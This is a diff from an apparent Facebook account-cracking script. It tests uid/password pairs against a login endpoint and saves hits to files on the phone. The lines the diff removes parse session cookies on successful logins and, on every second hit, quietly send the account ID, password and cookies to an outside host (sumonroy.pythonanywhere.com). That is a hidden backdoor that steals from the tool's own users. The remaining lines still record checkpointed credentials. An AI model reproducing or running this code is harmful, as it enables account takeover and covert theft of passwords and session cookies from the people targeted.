@@ -1342,34 +1342,9 @@ def mbasic(uid,pwx,tl):
                         return True 
                 else:
                    continue
-            elif "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
-                cookie_raw = re.sub(r'\\(?!/)', '', response.text)
-                match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
-                if match:
-                    cookies_raw = match.group(1)
-                    cookies_json = json.loads(cookies_raw)
-                    cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
-                    c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                        statusok = (f"{c_user}|{pw}|{cok}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:
-                        print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
-                        print("Cookies:", cok)
-                        open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
-                        oks.append(uid)
-                        return True 
-                else:
-                   continue
-            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open("/sdcard/SUMON_file_CP1.txt", "a").write(f"{uid}|{pw}\n")
-                cps.append(uid)
-                break
             elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open("/sdcard/SUMON_file_CP2.txt", "a").write(f"{uid}|{pw}\n")
+                open("/sdcard/SUMON_file_CP.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid)
                 break
             else:
